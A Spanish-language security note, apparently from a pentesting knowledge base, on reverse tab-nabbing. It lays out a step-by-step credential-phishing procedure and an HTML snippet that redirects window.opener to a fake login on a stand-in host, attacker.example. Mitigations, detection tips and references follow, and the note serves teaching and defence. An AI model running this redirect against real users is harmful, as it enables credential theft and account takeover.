---
topic: Reverse tab-nabbing — secuestro de la pestaña original
tags: [web, tabnabbing, target-blank, noopener, phishing]
---

# Reverse tab-nabbing — secuestro de la pestaña original

[🌐 English](reverse-tabnabbing.en.md) | **Español**

## Concepto

Un enlace con `target="_blank"` sin `rel="noopener"` deja a la página abierta acceso a `window.opener`. Esa página puede cambiar la ubicación de la pestaña original y mostrar un login falso para capturar credenciales.

## Cuándo aplica

- Un usuario privilegiado revisa enlaces enviados por otros.
- El enlace se abre en una pestaña nueva sin `noopener`.
- La sesión se mantiene en la pestaña original.

## Procedimiento

1. Publicar un enlace a una página controlada.
2. Redirigir `window.opener.location` a un login clonado.
3. Registrar el POST con usuario y contraseña.
4. Usar las credenciales en el panel real.

## Comandos

```html
<script>
window.opener.location = 'https://attacker.example/login';
</script>
<!-- el login falso envía el POST al atacante y redirige al sitio real -->
```

## Variantes

- Cambiar el formulario con `window.opener.document`.
- Retrasar la redirección para que el usuario no note el cambio.
- Combinar con un clon visual del panel.

## Limitaciones

- Los navegadores modernos aplican `noopener` implícito en muchos casos.
- La víctima debe volver a la pestaña original y escribir.
- Una política estricta de referrer puede alertar.

## Mitigación

- Añadir `rel="noopener noreferrer"` a enlaces externos.
- Abrir enlaces de usuario en un dominio aislado.
- Reautenticar acciones sensibles.

## Detección

- Enlaces de usuario que abren pestañas nuevas.
- Redirecciones de la pestaña original tras revisar un enlace.
- Logins desde ubicaciones inesperadas.

## Referencias

- [0xdf — Developer](https://0xdf.gitlab.io/2022/01/15/htb-developer.html)
- [OWASP — Reverse tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
- [MDN — rel=noopener](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener)
